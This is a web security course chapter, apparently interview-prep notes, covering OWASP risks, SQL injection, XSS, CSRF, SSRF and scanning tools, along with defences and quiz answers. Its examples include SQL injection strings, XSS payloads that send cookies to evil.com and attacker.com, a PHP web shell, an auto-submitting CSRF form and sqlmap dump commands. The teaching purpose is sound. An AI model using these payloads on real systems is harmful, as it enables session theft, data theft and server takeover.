# 08. Web Security

## Table of Contents
- [8.1 How Websites Work](#81-how-websites-work)
- [8.2 OWASP Top 10](#82-owasp-top-10)
- [8.3 SQL Injection (In-Depth)](#83-sql-injection-in-depth)
- [8.4 Cross-Site Scripting (XSS)](#84-cross-site-scripting-xss)
- [8.5 Cross-Site Request Forgery (CSRF)](#85-cross-site-request-forgery-csrf)
- [8.6 Other Web Vulnerabilities](#86-other-web-vulnerabilities)
- [8.7 Web Security Tools](#87-web-security-tools)
- [8.8 Common Mistakes & Interview Tips](#88-common-mistakes--interview-tips)
- [8.9 Practice & Assessment](#89-practice--assessment)

---

## 8.1 How Websites Work

### Request-Response Cycle

```
User's Browser                              Web Server
     │                                          │
     │── HTTP Request ─────────────────────────►│
     │   GET /login HTTP/1.1                    │
     │   Host: example.com                      │
     │   Cookie: session=abc123                 │
     │                                          │── Processes request
     │                                          │── Queries database
     │                                          │── Generates response
     │◄── HTTP Response ────────────────────────│
     │   HTTP/1.1 200 OK                        │
     │   Content-Type: text/html                │
     │   <html>...</html>                       │
     │                                          │
     │── Renders page in browser                │
```

### Web Application Architecture

```
┌──────────┐     ┌──────────────┐     ┌──────────┐
│  Client  │◄───►│  Web Server  │◄───►│ Database │
│ (Browser)│     │ (Apache/Nginx│     │ (MySQL/  │
│          │     │  + PHP/Node) │     │  PostgreSQL)
└──────────┘     └──────────────┘     └──────────┘
   Frontend         Backend             Storage

Attack surfaces exist at EVERY boundary:
  • Client ↔ Server: MITM, XSS, session hijacking
  • Server ↔ Database: SQL injection
  • Server itself: misconfigurations, vulnerabilities
```

### Session Management

```
1. User logs in with username + password
2. Server creates a session: session_id = "abc123"
3. Server sends cookie: Set-Cookie: session=abc123
4. Browser stores cookie
5. Every subsequent request includes: Cookie: session=abc123
6. Server checks session_id → knows who the user is

ATTACK: If attacker steals the cookie → they ARE the user
```

---

## 8.2 OWASP Top 10

The **OWASP Top 10** is the most recognized list of critical web application security risks (updated every few years).

| Rank | Vulnerability | Description |
|------|--------------|-------------|
| A01 | **Broken Access Control** | Users can access unauthorized resources |
| A02 | **Cryptographic Failures** | Sensitive data exposed (weak/no encryption) |
| A03 | **Injection** | SQL, NoSQL, OS, LDAP injection |
| A04 | **Insecure Design** | Flawed architecture/logic |
| A05 | **Security Misconfiguration** | Default credentials, open cloud storage |
| A06 | **Vulnerable Components** | Using outdated libraries with known CVEs |
| A07 | **Authentication Failures** | Weak login, no MFA, credential stuffing |
| A08 | **Software & Data Integrity** | Untrusted updates, insecure CI/CD |
| A09 | **Security Logging Failures** | No logs → can't detect attacks |
| A10 | **Server-Side Request Forgery** | Server makes requests to internal systems |

---

## 8.3 SQL Injection (In-Depth)

### Step-by-Step Attack

**Vulnerable PHP code:**
```php
$user = $_POST['username'];
$pass = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
$result = mysqli_query($conn, $query);
```

**Step 1 — Test for vulnerability:**
```
Input: Username = '
Result: SQL error displayed → vulnerable!
```

**Step 2 — Bypass authentication:**
```
Username: admin' --
Password: anything

Query becomes:
SELECT * FROM users WHERE username='admin' --' AND password='anything'
                                            ↑ everything after -- is a comment
Result: Logged in as admin!
```

**Step 3 — Extract data (UNION-based):**
```
Input: ' UNION SELECT 1,username,password FROM users --

Query: SELECT id,name,email FROM products WHERE id='' UNION SELECT 1,username,password FROM users --'

Result: All usernames and password hashes displayed!
```

**Step 4 — Find database info:**
```sql
' UNION SELECT 1,table_name,3 FROM information_schema.tables --
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --
```

### SQLi Types

| Type | How It Works | Detection |
|------|-------------|-----------|
| **In-band (Classic)** | Results visible on the page | See data directly |
| **Error-based** | Database errors reveal info | Error messages with DB data |
| **Boolean Blind** | True/false changes page content | Compare page differences |
| **Time-based Blind** | Delay indicates true/false | `IF(condition, SLEEP(5), 0)` |
| **Out-of-band** | Data sent to attacker's server | DNS/HTTP exfiltration |

### Prevention

```python
# ✅ SAFE: Parameterized query (prepared statement)
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", 
               (username, password_hash))

# ✅ SAFE: ORM (Object Relational Mapping)
user = User.query.filter_by(username=username).first()

# ❌ UNSAFE: String concatenation
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
```

### SQLMap Tool (Automated SQLi Testing)

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --dbs

# With POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# Dump specific database
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# ⚠️ ONLY use on applications you OWN or have WRITTEN PERMISSION to test
```

---

## 8.4 Cross-Site Scripting (XSS)

### How XSS Works

```
1. Attacker finds input that's reflected/stored without sanitization
2. Injects JavaScript: <script>malicious_code</script>
3. Victim's browser executes the script
4. Script can: steal cookies, redirect, keylog, modify page
```

### XSS Types

| Type | Storage | Trigger | Severity |
|------|---------|---------|----------|
| **Reflected** | Not stored (in URL) | Victim clicks malicious link | Medium |
| **Stored** | Saved in database | Anyone viewing the page | High |
| **DOM-based** | Client-side JS | Client-side processing | Medium |

### Reflected XSS Example

```
Vulnerable URL:
https://shop.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

Server response:
<p>Search results for: <script>document.location='https://evil.com/steal?c='+document.cookie</script></p>

Browser executes the script → cookies sent to attacker
```

### Stored XSS Example

```
Attacker posts a comment on a forum:
"Great article! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>"

Comment is saved in database.

Every user who views the page → script executes → cookies stolen.
This is MORE dangerous because it affects ALL visitors.
```

### XSS Payloads (For Testing YOUR OWN Apps)

```html
<!-- Basic test -->
<script>alert('XSS')</script>

<!-- Cookie theft -->
<script>fetch('https://attacker.com/log?c='+document.cookie)</script>

<!-- Bypassing filters -->
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">

<!-- Encoded -->
<script>alert(String.fromCharCode(88,83,83))</script>
```

### Prevention

```
1. OUTPUT ENCODING — Encode special characters before displaying
   < → &lt;    > → &gt;    " → &quot;    ' → &#x27;

2. CONTENT SECURITY POLICY (CSP) — Header that restricts script sources
   Content-Security-Policy: script-src 'self'

3. HttpOnly COOKIES — JavaScript can't access cookies
   Set-Cookie: session=abc123; HttpOnly; Secure

4. INPUT VALIDATION — Whitelist allowed characters
   Only accept alphanumeric for usernames

5. WAF (Web Application Firewall) — Block known attack patterns
```

---

## 8.5 Cross-Site Request Forgery (CSRF)

### How CSRF Works

```
Precondition: Victim is logged into bank.com (has active session)

1. Attacker creates a malicious page with hidden form:

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

2. Victim visits attacker's page
3. Hidden form auto-submits to bank.com
4. Browser includes victim's bank.com cookies
5. Bank processes transfer — victim loses money!
```

### Prevention

| Method | How It Works |
|--------|-------------|
| **Anti-CSRF Token** | Server generates random token per form; validates on submit |
| **SameSite Cookies** | `Set-Cookie: session=abc; SameSite=Strict` — cookie not sent cross-site |
| **Re-authentication** | Require password for sensitive actions (money transfer) |
| **Referer Check** | Verify request came from the same domain |

---

## 8.6 Other Web Vulnerabilities

### Broken Access Control (IDOR)

```
Normal:   GET /api/user/123/profile    → See YOUR profile
Attack:   GET /api/user/124/profile    → See SOMEONE ELSE's profile!

Fix: Verify authorization, not just authentication
  if (request.user.id != requested_id) { return 403; }
```

### Server-Side Request Forgery (SSRF)

```
Vulnerable feature: "Enter a URL to fetch its content"

Normal: User enters https://example.com → server fetches it
Attack: User enters http://169.254.169.254/latest/meta-data/
        → Server fetches AWS metadata (internal!)
        → Exposes cloud credentials, internal IPs

Fix: Whitelist allowed URLs, block internal ranges
```

### Security Misconfiguration

```
Common misconfigurations:
  ✗ Default credentials (admin/admin)
  ✗ Directory listing enabled
  ✗ Debug mode in production
  ✗ Unnecessary services running
  ✗ Missing security headers
  ✗ Open S3 buckets / cloud storage
  ✗ Stack traces exposed to users
```

### File Upload Vulnerabilities

```
Attack: Upload a PHP web shell disguised as an image

malicious.php.jpg → server only checks extension
<?php system($_GET['cmd']); ?>

Then access: https://target.com/uploads/malicious.php.jpg?cmd=whoami

Fix:
  ✓ Validate file type by magic bytes, not extension
  ✓ Store uploads outside web root
  ✓ Rename uploaded files
  ✓ Disable execution in upload directory
```

---

## 8.7 Web Security Tools

### Burp Suite (Web Proxy)

```
Browser ──► Burp Suite (Proxy) ──► Web Server
             │
             ├── Intercept requests/responses
             ├── Modify parameters
             ├── Repeat requests (Repeater)
             ├── Automate testing (Intruder)
             └── Scan for vulnerabilities (Scanner)

Setup:
1. Start Burp Suite
2. Set browser proxy: 127.0.0.1:8080
3. Browse the target website
4. All traffic visible in Burp's Proxy → HTTP History
```

### Nikto (Web Server Scanner)

```bash
# Scan a web server for vulnerabilities
nikto -h http://target.com

# Scan specific port
nikto -h http://target.com -p 8080

# Save results
nikto -h http://target.com -o results.html -Format htm
```

### Dirb / Gobuster (Directory Brute-Force)

```bash
# Find hidden directories/files
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Gobuster (faster)
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Common findings:
#   /admin      → Admin panel
#   /backup     → Backup files
#   /config     → Configuration files
#   /.git       → Source code exposure!
#   /api        → API endpoints
```

### OWASP ZAP (Free Alternative to Burp)

```
Features:
  • Intercepting proxy
  • Active/passive scanning
  • Automated vulnerability detection
  • API testing
  • Free and open-source
```

---

## 8.8 Common Mistakes & Interview Tips

### Common Mistakes

| Mistake | Fix |
|---------|-----|
| Trusting client-side validation | Always validate server-side too |
| Storing passwords in plaintext | Use bcrypt/Argon2 with salt |
| Using `http://` for login pages | Always use HTTPS |
| Showing detailed error messages | Generic errors to users, detailed logs server-side |
| Not setting security headers | Add CSP, HSTS, X-Frame-Options |

### Interview Questions

**Q: What is the OWASP Top 10?**
> A regularly updated list of the 10 most critical web application security risks, maintained by the Open Web Application Security Project. Used as a standard for web security.

**Q: Explain SQL Injection and how to prevent it.**
> SQL injection occurs when user input is concatenated into SQL queries without sanitization. An attacker can inject SQL code to bypass auth, read/modify data, or execute commands. Prevention: parameterized queries, input validation, WAF, least-privilege DB accounts.

**Q: What is the difference between Reflected and Stored XSS?**
> Reflected XSS is in the URL and requires the victim to click a link. Stored XSS is saved in the database and affects all users who view the page. Stored XSS is more dangerous.

**Q: What is CSRF and how does it differ from XSS?**
> CSRF forces a user to perform actions on a site where they're authenticated, without their knowledge. XSS injects scripts into pages. CSRF exploits the site's trust in the user's browser; XSS exploits the user's trust in the site.

---

## 8.9 Practice & Assessment

### MCQs

**Q1.** OWASP Top 10 #1 (2021) is:
- A) SQL Injection
- B) Broken Access Control
- C) XSS
- D) CSRF

**Answer:** B) Broken Access Control

---

**Q2.** Which type of XSS is most dangerous?
- A) Reflected
- B) DOM-based
- C) Stored
- D) All are equal

**Answer:** C) Stored (affects all visitors)

---

**Q3.** `' OR '1'='1` is used in:
- A) XSS attacks
- B) SQL Injection
- C) CSRF attacks
- D) DDoS attacks

**Answer:** B) SQL Injection

---

**Q4.** To prevent CSRF, you should use:
- A) Stronger passwords
- B) Anti-CSRF tokens
- C) Antivirus software
- D) Encryption

**Answer:** B) Anti-CSRF tokens

---

### Scenario-Based Questions

**Scenario 1:** A developer writes: `query = "SELECT * FROM items WHERE id=" + user_input`. An attacker sends `id=1; DROP TABLE items;--`. What happens?
> The database executes TWO queries: the SELECT and then drops the items table. This is SQL injection. Fix: use parameterized queries.

**Scenario 2:** A blog allows users to post comments. A user posts: `<script>fetch('https://evil.com?c='+document.cookie)</script>`. All visitors' cookies are stolen. What vulnerability is this?
> Stored XSS. The malicious script is saved in the database and executed by every visitor's browser. Fix: output encoding, CSP, HttpOnly cookies.

---

> **Next Topic:** [09 - Ethical Hacking Process](09-ethical-hacking-process.md)
